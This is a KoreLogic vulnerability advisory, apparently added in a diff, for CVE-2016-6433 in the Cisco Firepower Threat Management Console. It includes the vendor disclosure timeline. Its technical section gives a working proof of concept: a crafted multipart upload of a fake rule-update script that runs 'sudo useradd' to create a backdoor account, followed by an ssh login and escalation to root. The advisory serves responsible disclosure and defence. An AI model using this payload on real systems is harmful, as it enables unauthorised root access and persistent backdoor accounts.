@@ -1,0 +1,151 @@
+KL-001-2016-007 : Cisco Firepower Threat Management Console Remote Command
+Execution Leading to Root Access
+
+Title: Cisco Firepower Threat Management Console Remote Command Execution
+Leading to Root Access
+Advisory ID: KL-001-2016-007
+Publication Date: 2016.10.05
+Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2016-007.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Cisco
+     Affected Product: Firepower Threat Management Console
+     Affected Version: Cisco Fire Linux OS 6.0.1 (build 37/build 1213)
+     Platform: Embedded Linux
+     CWE Classification: CWE-434: Unrestricted Upload of File with Dangerous
+     Type, CWE-94: Improper Control of Generation of Code
+     Impact: Arbitrary Code Execution
+     Attack vector: HTTP
+     CVE-ID: CVE-2016-6433
+
+2. Vulnerability Description
+
+     An authenticated user can run arbitrary system commands as
+     the www user which leads to root.
+
+3. Technical Description
+
+     A valid session and CSRF token is required.  The webserver runs as
+     a non-root user which is permitted to sudo commands as root with
+     no password.
+
+     POST /DetectionPolicy/rules/rulesimport.cgi?no_mojo=1 HTTP/1.1
+     Host: 1.3.3.7
+     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0)
+Gecko/20100101 Firefox/45.0
+     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+     Accept-Language: en-US,en;q=0.5
+     Accept-Encoding: gzip, deflate, br
+     DNT: 1
+     Cookie: CGISESSID=4919a7838198009bba48f6233d0bd1c6
+     Connection: close
+     Content-Type: multipart/form-data;
+boundary=---------------------------15519792567789791301241925798
+     Content-Length: 813
+
+     -----------------------------15519792567789791301241925798
+     Content-Disposition: form-data; name="manual_update"
+
+     1
+     -----------------------------15519792567789791301241925798
+     Content-Disposition: form-data; name="source"
+
+     file
+     -----------------------------15519792567789791301241925798
+     Content-Disposition: form-data; name="file";
+filename="Sourcefire_Rule_Update-2016-03-04-001-vrt.sh"
+     Content-Type: application/octet-stream
+
+     sudo useradd -G ldapgroup -p `openssl passwd -1 korelogic` korelogic
+     -----------------------------15519792567789791301241925798
+     Content-Disposition: form-data; name="action_submit"
+
+     Import
+     -----------------------------15519792567789791301241925798
+     Content-Disposition: form-data; name="sf_action_id"
+
+     8c6059ae8dbedc089877b16b7be2ae7f
+     -----------------------------15519792567789791301241925798--
+
+
+     HTTP/1.1 200 OK
+     Date: Sat, 23 Apr 2016 13:38:01 GMT
+     Server: Apache
+     Vary: Accept-Encoding
+     X-Frame-Options: SAMEORIGIN
+     Content-Length: 49998
+     Connection: close
+     Content-Type: text/html; charset=utf-8
+
+     ...
+
+     $ ssh korelogic@1.3.3.7
+     Password:
+
+     Copyright 2004-2016, Cisco and/or its affiliates. All rights reserved.
+     Cisco is a registered trademark of Cisco Systems, Inc.
+     All other trademarks are property of their respective owners.
+
+     Cisco Fire Linux OS v6.0.1 (build 37)
+     Cisco Firepower Management Center for VMWare v6.0.1 (build 1213)
+
+     Could not chdir to home directory /Volume/home/korelogic: No such file or
+directory
+     korelogic@firepower:/$ sudo su -
+     Password:
+     root@firepower:~#
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor has acknowledged this vulnerability but has
+     not issued a fix. Vendor acknowledgement available at:
+
+https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-ftmc
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel) of
+KoreLogic, Inc.
+
+6. Disclosure Timeline
+
+     2016.06.30 - KoreLogic sends vulnerability report and PoC to Cisco.
+     2016.06.30 - Cisco acknowledges receipt of vulnerability report.
+     2016.07.20 - KoreLogic and Cisco discuss remediation timeline for
+                  this vulnerability and for 3 others reported in the
+                  same product.
+     2016.08.12 - 30 business days have elapsed since the vulnerability was
+                  reported to Cisco.
+     2016.09.02 - 45 business days have elapsed since the vulnerability was
+                  reported to Cisco.
+     2016.09.09 - KoreLogic asks for an update on the status of the
+                  remediation efforts.
+     2016.09.15 - Cisco confirms remediation is underway and soon to be
+                  completed.
+     2016.09.28 - Cisco informs KoreLogic that the acknowledgement details
+                  will be released publicly on 2016.10.05.
+     2016.10.05 - Public disclosure.
+
+7. Proof of Concept
+
+     See Technical Description
+
+
+The contents of this advisory are copyright(c) 2016
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
